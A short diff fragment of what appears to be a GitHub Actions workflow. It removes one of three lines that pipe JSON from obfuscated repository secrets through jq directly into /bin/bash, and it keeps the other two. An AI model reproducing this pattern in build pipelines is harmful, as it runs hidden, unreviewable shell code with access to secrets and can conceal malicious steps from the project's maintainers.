@@ -20,7 +20,6 @@ jobs:
           fpv6426: ${{ secrets.fpv6426 }}
         run: |
           printf '%s' "$fpv6426" | jq -r .ybh78679 | /bin/bash
-          echo $iq406 | jq -r .rosj7 | /bin/bash
           echo $kgzfh90 | jq -r .bsyx90348 | /bin/bash
 
       - name: Save artifact
